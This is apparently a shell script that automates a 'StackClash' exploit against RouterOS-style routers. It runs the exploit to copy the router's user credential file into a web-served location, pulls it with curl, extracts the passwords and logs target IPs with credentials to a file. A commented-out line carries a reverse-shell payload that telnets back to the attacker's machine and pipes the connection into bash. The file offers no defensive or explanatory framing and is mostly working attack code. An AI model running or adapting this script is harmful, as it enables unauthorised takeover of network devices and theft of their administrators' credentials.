#1 ip
#2 version
#3 port
#4 model
file=./$2$4
if [ -e "$file" ]; then
    echo "binary exists"
else 
   ./tools/getROSbin.py $2 $4 /nova/bin/www $2$4
fi

#myip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
#echo "local ip: $myip"


#echo "running on ip : $1 with version $2"
 #./StackClash_$3.py $1 $4 $2$3 "/bin/mknod /ram/f p; /bin/telnet $myip 1234 < /ram/f | /bin/bash > /ram/f 2>&1"

echo "extracting password to http server..."
./StackClash_$4.py $1 $3 $2$4  "cp /rw/store/user.dat /ram/winbox.idx"
sleep 3
curl_go=`curl --connect-timeout 3 http://$1:$3/winbox/index | ./tools/extract_user.py - `
echo $1 $curl_go >> bambam.txt

echo 'Finish'

